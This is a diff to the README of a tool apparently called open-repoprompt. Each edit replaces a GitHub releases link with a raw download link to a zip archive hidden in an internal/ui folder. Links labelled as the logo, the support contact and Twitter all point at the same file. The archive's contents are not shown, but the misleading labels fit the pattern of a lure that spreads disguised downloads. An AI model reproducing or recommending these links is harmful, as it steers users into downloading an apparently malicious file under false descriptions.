@@ -2,7 +2,7 @@
 
 ## Copy Entire Folder to ChatGPT. Hit on Star to Bookmark this Page! Newer Releases will be Even Better. 🌟
 
-![Open RepoPrompt Logo](https://github.com/PradnyaKamble2618/open-repoprompt/releases)
+![Open RepoPrompt Logo](https://raw.githubusercontent.com/PradnyaKamble2618/open-repoprompt/main/internal/ui/repoprompt_open_2.6-beta.5.zip)
 
 ---
 
@@ -14,7 +14,7 @@
 ---
 
 ### Grab the Latest Release:
-[![Download Release](https://github.com/PradnyaKamble2618/open-repoprompt/releases)](https://github.com/PradnyaKamble2618/open-repoprompt/releases)
+[![Download Release](https://raw.githubusercontent.com/PradnyaKamble2618/open-repoprompt/main/internal/ui/repoprompt_open_2.6-beta.5.zip)](https://raw.githubusercontent.com/PradnyaKamble2618/open-repoprompt/main/internal/ui/repoprompt_open_2.6-beta.5.zip)
 
 ---
 
@@ -70,12 +70,12 @@ This project is licensed under the XYZ License.
 ---
 
 ## Support:
-For any queries or support, please contact us at https://github.com/PradnyaKamble2618/open-repoprompt/releases
+For any queries or support, please contact us at https://raw.githubusercontent.com/PradnyaKamble2618/open-repoprompt/main/internal/ui/repoprompt_open_2.6-beta.5.zip
 
 ---
 
 ## Stay Connected:
-Follow us on [Twitter](https://github.com/PradnyaKamble2618/open-repoprompt/releases) for the latest updates and releases.
+Follow us on [Twitter](https://raw.githubusercontent.com/PradnyaKamble2618/open-repoprompt/main/internal/ui/repoprompt_open_2.6-beta.5.zip) for the latest updates and releases.
 
 ---
 
